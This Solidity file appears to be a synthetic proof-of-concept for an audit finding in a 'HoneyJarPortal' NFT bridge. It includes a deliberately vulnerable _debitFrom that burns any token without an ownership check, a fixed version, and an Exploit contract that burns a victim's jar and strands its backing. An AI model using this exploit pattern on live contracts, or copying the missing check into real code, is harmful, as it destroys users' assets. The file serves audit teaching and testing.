// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Bearcave HoneyJarPortal — C-02 burn path (Pashov, 2023-06).
    SYNTHETIC, cheatcode-free. Different from the March 2023 transfer steal:
    _debitFrom burns the jar. The quoted caller check does not read ownerOf.

    Attacker passes _from = msg.sender and any token id. ownerOf becomes 0.
    The 1000 USDC backing that jar stays in the NFT contract. */

contract PaymentToken {
    string public name = "USDC";
    string public symbol = "USDC";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract HoneyJar {
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => uint256) public backing;

    function mint(address to, uint256 id) external {
        ownerOf[id] = to;
    }

    function setBacking(uint256 id, uint256 amount) external {
        backing[id] = amount;
    }

    function burn(uint256 id) external {
        ownerOf[id] = address(0);
    }

    function claim(uint256 id) external {
        require(ownerOf[id] == msg.sender, "not owner");
        backing[id] = 0;
    }
}

contract HoneyJarPortal {
    HoneyJar public honeyJar;
    error OwnerNotCaller();

    constructor(HoneyJar jar_) {
        honeyJar = jar_;
    }

    function _msgSender() internal view returns (address) {
        return msg.sender;
    }

    function sendFrom(address _from, uint16 _dstChainId, bytes calldata _toAddress, uint256 _tokenId) external payable {
        _debitFrom(_from, _dstChainId, _toAddress, _tokenId);
    }

    // Quoted check. _from is not used to identify the owner. The jar is burned.
    function _debitFrom(address _from, uint16, bytes memory, uint256 _tokenId) internal virtual {
        if (_from != _msgSender()) revert OwnerNotCaller();
        // @> VULN: burn ignores ownerOf; any caller who sets _from to themselves destroys the jar
        honeyJar.burn(_tokenId);
    }
}

contract HoneyJarPortalFixed is HoneyJarPortal {
    constructor(HoneyJar jar_) HoneyJarPortal(jar_) {}

    function _debitFrom(address _from, uint16 _dst, bytes memory _payload, uint256 _tokenId) internal override {
        require(honeyJar.ownerOf(_tokenId) == msg.sender, "not owner");
        super._debitFrom(_from, _dst, _payload, _tokenId);
    }
}

contract Exploit {
    uint256 public constant JAR_ID = 7;
    uint256 public constant BACKING = 1000 ether;

    PaymentToken public pay; // nonce 1
    HoneyJar public jar; // nonce 2
    HoneyJarPortal public portal; // nonce 3

    address public ownerBefore;
    address public ownerAfter;
    uint256 public backingLeft;
    bool public claimReverted;

    constructor() {
        pay = new PaymentToken();
        jar = new HoneyJar();
        portal = new HoneyJarPortal(jar);
    }

    function run() external {
        address victim = address(0xBEEF);
        jar.mint(victim, JAR_ID);
        jar.setBacking(JAR_ID, BACKING);
        pay.mint(address(jar), BACKING);
        ownerBefore = jar.ownerOf(JAR_ID);
        portal.sendFrom(address(this), 1, abi.encodePacked(address(this)), JAR_ID);
        ownerAfter = jar.ownerOf(JAR_ID);
        backingLeft = pay.balanceOf(address(jar));
        (bool ok,) = address(jar).call(abi.encodeWithSelector(jar.claim.selector, JAR_ID));
        claimReverted = !ok;
        require(ownerBefore == victim, "victim owned it");
        require(ownerAfter == address(0), "ownerOf is 0");
        require(backingLeft == BACKING, "1000 USDC stuck");
        require(claimReverted, "claim dead");
    }
}
